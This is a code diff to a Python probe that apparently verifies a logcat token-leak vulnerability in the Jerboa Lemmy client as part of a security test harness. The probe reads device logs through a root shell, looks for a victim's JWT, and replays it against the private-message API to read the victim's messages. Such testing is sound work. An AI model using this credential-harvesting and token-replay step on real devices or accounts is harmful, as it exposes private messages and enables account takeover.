@@ -8,7 +8,6 @@ from __future__ import annotations
 
 import json
 import os
-import re
 import sys
 from pathlib import Path
 
@@ -19,7 +18,12 @@ def _load_and_run():
         sys.path.insert(0, str(parent))
 
     from jerboa_probe_utils import (
+        get_attested_pids,
+        get_boot_time,
+        get_device_time_info,
         get_victim_jwt_from_db,
+        parse_threadtime_epoch,
+        parse_threadtime_line,
         run_root_shell,
     )
 
@@ -33,11 +37,29 @@ def _load_and_run():
         "alice_dm_secret", ""
     )
 
-    # V-002: Root-readable logcat leak with post-exploit API access
+    # V-002: Root-readable logcat leak with post-exploit API access.
     success, log_output = run_root_shell("logcat -d -v threadtime -s LemmyAPI:V")
-    if success and victim_jwt in log_output:
-        jwt_match = re.search(r"Bearer\s+([A-Za-z0-9._\-]+)", log_output)
-        if jwt_match:
+    if success and log_output:
+        attested_pids = get_attested_pids()
+        boot_time = get_boot_time()
+        year, tzinfo = get_device_time_info()
+        leak_seen = False
+        for line in reversed(log_output.splitlines()):
+            prefix, pid, tag, msg, _ = parse_threadtime_line(line)
+            if not pid or pid not in attested_pids:
+                continue
+            if tag != "LemmyAPI":
+                continue
+            if victim_jwt not in msg and victim_jwt not in line:
+                continue
+            if year is not None and tzinfo is not None:
+                epoch = parse_threadtime_epoch(prefix or "", year, tzinfo)
+                if epoch is not None and epoch < boot_time:
+                    continue
+            leak_seen = True
+            break
+
+        if leak_seen:
             try:
                 import requests
 
@@ -45,7 +67,7 @@ def _load_and_run():
                 response = requests.get(
                     f"{base_url}/api/v3/private_message/list",
                     params={"type_": "All", "limit": 20},
-                    headers={"Authorization": f"Bearer {jwt_match.group(1)}"},
+                    headers={"Authorization": f"Bearer {victim_jwt}"},
                     timeout=10,
                 )
                 if response.status_code == 200:
